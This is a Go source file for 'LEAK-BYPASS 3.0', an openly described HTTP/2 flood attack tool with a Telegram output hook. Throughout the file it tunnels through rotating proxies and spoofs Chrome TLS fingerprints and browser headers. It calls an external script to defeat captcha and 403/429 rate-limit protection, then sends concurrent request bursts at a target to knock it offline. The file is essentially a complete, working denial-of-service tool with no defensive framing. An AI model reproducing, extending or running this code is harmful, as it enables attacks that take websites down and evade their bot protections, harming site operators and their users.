package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"

	utls "github.com/refraction-networking/utls"
	"golang.org/x/net/http2"
)

var mu sync.Mutex
var secFetchUser, acceptEncoding, secFetchDest, secFetchMode, secFetchSite, accept, priority string
var (
	statusCount    = make(map[int]int)
	errorCount     int
	totalCount     int
	counterMu      sync.Mutex
	debugMode      bool
	captchaMode    bool
	stopFlood      bool         // Flag to stop flood
	outputCallback func(string) // Callback to send output to Telegram
)

// StopFlood signals the flood to stop
func StopFlood() {
	stopFlood = true
}

// SetOutputCallback sets the callback function for sending output
func SetOutputCallback(cb func(string)) {
	outputCallback = cb
}

// floodOutput sends output to both console and callback (if set)
func floodOutput(msg string) {
	fmt.Print(msg)
	os.Stdout.Sync()
	if outputCallback != nil {
		outputCallback(msg)
	}
}

type BypassResult struct {
	Status string `json:"status"`
	UA     string `json:"ua"`
	Cookie string `json:"cookie"`
}

func runBypass(target string, proxy string) (*BypassResult, error) {
	var cmd *exec.Cmd
	if proxy != "" {
		cmd = exec.Command("node", "bypass.js", target, proxy)
	} else {
		cmd = exec.Command("node", "bypass.js", target)
	}
	output, err := cmd.Output()
	if err != nil {
		return nil, err
	}
	var result BypassResult
	err = json.Unmarshal(output, &result)
	if err != nil {
		return nil, err
	}
	return &result, nil
}

func getRandomInt(min, max int) int {
	return rand.Intn(max-min+1) + min
}

func readUntilDoubleCRLF(r io.Reader) (string, error) {
	br := bufio.NewReader(r)
	var response strings.Builder
	for {
		line, err := br.ReadString('\n')
		if err != nil {
			return "", err
		}
		response.WriteString(line)
		if strings.Contains(response.String(), "\r\n\r\n") {
			break
		}
	}
	return response.String(), nil
}

func flood(target string, rate int, proxies []string, wg *sync.WaitGroup) {
	defer wg.Done()
	// Bypass state local cho mỗi thread
	var localBypassCookie string
	var localBypassUA string
	var localBypassDone bool
	for {
		// Check if we should stop
		if stopFlood {
			return
		}
		px := proxies[rand.Intn(len(proxies))]
		proxyParts := strings.Split(px, ":")
		var proxyHost, proxyPort, proxyUser, proxyPass string
		if len(proxyParts) == 2 {
			proxyHost, proxyPort = proxyParts[0], proxyParts[1]
		} else if len(proxyParts) == 4 {
			proxyHost, proxyPort = proxyParts[0], proxyParts[1]
			proxyUser, proxyPass = proxyParts[2], proxyParts[3]
		}

		u, err := url.Parse(target)
		if err != nil {
			continue
		}
		host := u.Hostname()
		port := u.Port()
		if port == "" {
			port = "443"
		}
		targetAddr := net.JoinHostPort(host, port)
		proxyConn, err := net.DialTimeout("tcp", net.JoinHostPort(proxyHost, proxyPort), 30*time.Second)
		if err != nil {
			continue
		}

		var connectReq string
		if proxyUser != "" && proxyPass != "" {
			auth := base64.StdEncoding.EncodeToString([]byte(proxyUser + ":" + proxyPass))
			connectReq = fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\nProxy-Authorization: Basic %s\r\nProxy-Connection: Keep-Alive\r\n\r\n", targetAddr, targetAddr, auth)
		} else {
			connectReq = fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\nProxy-Connection: Keep-Alive\r\n\r\n", targetAddr, targetAddr)
		}
		_, err = proxyConn.Write([]byte(connectReq))
		if err != nil {
			proxyConn.Close()
			continue
		}

		proxyConn.SetReadDeadline(time.Now().Add(5 * time.Second))
		resp, err := readUntilDoubleCRLF(proxyConn)
		if err != nil || !strings.HasPrefix(strings.SplitN(resp, "\r\n", 2)[0], "HTTP/1.1 200") {
			proxyConn.Close()
			continue
		}

		proxyConn.SetReadDeadline(time.Time{})

		rand.Seed(time.Now().UnixNano())
		ver := getRandomInt(1, 99)
		ver1 := getRandomInt(1, 99)
		ver2 := getRandomInt(1, 99)
		versions := []int{100, 102, 106, 112, 120, 131}
		version := versions[rand.Intn(len(versions))]
		tlsConf := &utls.Config{ServerName: host, InsecureSkipVerify: true}

		var utlsConn *utls.UConn

		switch version {
		case 100:
			utlsConn = utls.UClient(proxyConn, tlsConf, utls.HelloChrome_100)
		case 102:
			utlsConn = utls.UClient(proxyConn, tlsConf, utls.HelloChrome_102)
		case 106:
			utlsConn = utls.UClient(proxyConn, tlsConf, utls.HelloChrome_106_Shuffle)
		case 112:
			utlsConn = utls.UClient(proxyConn, tlsConf, utls.HelloChrome_112_PSK_Shuf)
		case 120:
			utlsConn = utls.UClient(proxyConn, tlsConf, utls.HelloChrome_120)
		case 131:
			utlsConn = utls.UClient(proxyConn, tlsConf, utls.HelloChrome_131)
		}

		if err = utlsConn.Handshake(); err != nil {
			proxyConn.Close()
			continue
		}

		ua := fmt.Sprintf(`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.%d.%d Safari/537.36`, version, ver1, ver2)

		if utlsConn.ConnectionState().NegotiatedProtocol != "h2" {
			utlsConn.Close()
			proxyConn.Close()
			continue
		}
		transport := &http2.Transport{
			DialTLSContext: func(ctx context.Context, network, addr string, cfg *tls.Config) (net.Conn, error) {
				return utlsConn, nil
			},
			AllowHTTP: true,
		}

		client := &http.Client{
			Transport: transport,
			Timeout:   10 * time.Second,
		}
		if rand.Float32() < 0.5 {
			secFetchUser = "?0"
		} else {
			secFetchUser = "?1"
		}
		if rand.Float32() < 0.5 {
			acceptEncoding = "gzip, deflate, br, zstd"
		} else {
			acceptEncoding = "gzip, deflate, br"
		}
		if rand.Float32() < 0.5 {
			secFetchDest = "document"
		} else {
			secFetchDest = "empty"
		}
		if rand.Float32() < 0.5 {
			secFetchMode = "navigate"
		} else {
			secFetchMode = "cors"
		}
		if rand.Float32() < 0.5 {
			secFetchSite = "none"
		} else {
			secFetchSite = "same-site"
		}
		if rand.Float32() < 0.5 {
			accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
		} else {
			accept = "application/json"
		}
		if rand.Float32() < 0.5 {
			priority = "u=0, i"
		} else {
			priority = "u=1, i"
		}
		platform := "Windows"

		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("sec-ch-ua", fmt.Sprintf(`"Chromium";v="%d", "Google Chrome";v="%d", "Not-A.Brand";v="%d"`, version, version, ver))
		req.Header.Set("sec-ch-ua-mobile", "?0")
		req.Header.Set("sec-ch-ua-platform", platform)
		req.Header.Set("user-agent", ua)
		req.Header.Set("accept", accept)
		req.Header.Set("sec-fetch-site", secFetchSite)
		req.Header.Set("sec-fetch-mode", secFetchMode)
		req.Header.Set("sec-fetch-user", secFetchUser)
		req.Header.Set("sec-fetch-dest", secFetchDest)
		req.Header.Set("accept-encoding", acceptEncoding)
		req.Header.Set("accept-language", "ru,en-US;q=0.9,en;q=0.8")
		req.Header.Set("priority", priority)
		resp3, err := client.Do(req)
		if debugMode {
			counterMu.Lock()
			totalCount++
			if err != nil {
				errorCount++
				counterMu.Unlock()
				utlsConn.Close()
				proxyConn.Close()
				continue
			}
			statusCount[resp3.StatusCode]++
			counterMu.Unlock()
		}
		if err != nil {
			utlsConn.Close()
			proxyConn.Close()
			continue
		}

		// Xử lý 403/429 với captcha mode
		if captchaMode && (resp3.StatusCode == 403 || resp3.StatusCode == 429) {
			resp3.Body.Close()
			if !localBypassDone {
				fmt.Printf("[leak-bypass] | Status %d | Launching browser with proxy: %s\n", resp3.StatusCode, px)
				bypassResult, err := runBypass(target, px)
				if err == nil && strings.HasPrefix(bypassResult.Status, "success") {
					localBypassCookie = bypassResult.Cookie
					localBypassUA = bypassResult.UA
					localBypassDone = true
					fmt.Printf("[leak-bypass] | Bypass success | UA: %s | Cookie: %s\n", localBypassUA, localBypassCookie)
				} else {
					if err != nil {
						fmt.Printf("[leak-bypass] | Bypass error: %v\n", err)
					} else {
						fmt.Printf("[leak-bypass] | Bypass failed: %s\n", bypassResult.Status)
					}
				}
			}
			if localBypassDone {
				req.Header.Set("Cookie", localBypassCookie)
				req.Header.Set("user-agent", localBypassUA)
			} else {
				utlsConn.Close()
				proxyConn.Close()
				continue
			}
			//time.Sleep(1 * time.Second)
		} else if !captchaMode && (resp3.StatusCode == 403 || resp3.StatusCode == 429) {
			// Không có --captcha, gặp 403/429 thì continue sang proxy mới
			resp3.Body.Close()
			utlsConn.Close()
			proxyConn.Close()
			continue
		} else {
			cookies := resp3.Cookies()
			var localCookieHeader string
			for _, c := range cookies {
				localCookieHeader += c.Name + "=" + c.Value + "; "
			}
			localCookieHeader = strings.TrimRight(localCookieHeader, "; ")
			req.Header.Set("Cookie", localCookieHeader)
			resp3.Body.Close()
		}
		stopChan := make(chan bool, 1)
		stopped := false
	RequestLoop:
		for {
			var rateWg sync.WaitGroup
			for i := 0; i < rate; i++ {
				rateWg.Add(1)
				go func() {
					defer rateWg.Done()
					resp2, err := client.Do(req)
					if debugMode {
						counterMu.Lock()
						totalCount++
						if err != nil {
							errorCount++
							counterMu.Unlock()
							// Gặp error thì cũng break để đổi proxy
							select {
							case stopChan <- true:
							default:
							}
							return
						}
						statusCount[resp2.StatusCode]++
						counterMu.Unlock()
					}
					if err != nil {
						// Gặp error thì break để đổi proxy
						select {
						case stopChan <- true:
						default:
						}
						return
					}
					if resp2.StatusCode == 403 || resp2.StatusCode == 429 {
						resp2.Body.Close()
						select {
						case stopChan <- true:
						default:
						}
						return
					}
					resp2.Body.Close()
				}()
			}
			rateWg.Wait()
			select {
			case <-stopChan:
				stopped = true
				break RequestLoop
			default:
			}
			// Không có --captcha thì chỉ chạy 1 lần rate rồi break
			if !captchaMode {
				break RequestLoop
			}
			time.Sleep(1 * time.Second)
		}
		_ = stopped
		utlsConn.Close()
		proxyConn.Close()
	}
}

// RunFlood runs the flood attack with given parameters
func RunFlood(target string, durationSeconds int, thread int, rate int, proxyFile string, debug bool, captcha bool) {
	debugMode = debug
	captchaMode = captcha
	stopFlood = false // Reset stop flag

	// Log flags status
	floodOutput(fmt.Sprintf("[leak-bypass] Debug mode: %v | Captcha mode: %v\n", debugMode, captchaMode))

	if rate > 90 {
		fmt.Println("[leak-bypass] : Rate can not be higher than 90")
		return
	}

	file, err := os.Open(proxyFile)
	if err != nil {
		fmt.Printf("[leak-bypass] : Proxy err: %v\n", err)
		return
	}

	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		text := strings.TrimSpace(scanner.Text())
		if text != "" {
			proxies = append(proxies, text)
		}
	}
	file.Close()

	if len(proxies) == 0 {
		fmt.Println("[leak-bypass] : No proxies found in file")
		return
	}

	runtime.GOMAXPROCS(runtime.NumCPU())

	floodOutput(fmt.Sprintf("LEAK-BYPASS 3.0 | Attack started | Target %v | Time %d | Threads %d | rps %d\n", target, durationSeconds, thread, rate))
	for i := 0; i < thread; i++ {
		go func() {
			var wg sync.WaitGroup
			wg.Add(1)
			flood(target, rate, proxies, &wg)
			wg.Wait()
		}()
	}

	if debugMode {
		go func() {
			for {
				if stopFlood {
					return
				}
				time.Sleep(1 * time.Second)
				if stopFlood {
					return
				}
				counterMu.Lock()
				var sb strings.Builder
				sb.WriteString(fmt.Sprintf("[go/bypass] Total: %d | ", totalCount))
				for code, count := range statusCount {
					sb.WriteString(fmt.Sprintf("%d: %d | ", code, count))
				}
				sb.WriteString(fmt.Sprintf("Error: %d\n", errorCount))
				floodOutput(sb.String())
				statusCount = make(map[int]int)
				errorCount = 0
				totalCount = 0
				counterMu.Unlock()
			}
		}()
	}

	// Wait for duration or stop signal
	for i := 0; i < durationSeconds; i++ {
		if stopFlood {
			floodOutput("LEAK-BYPASS 3.0 | Attack stopped by user\n")
			return
		}
		time.Sleep(1 * time.Second)
	}
	floodOutput("LEAK-BYPASS 3.0 | Attack ended | script by @leak-dev0410\n")
}
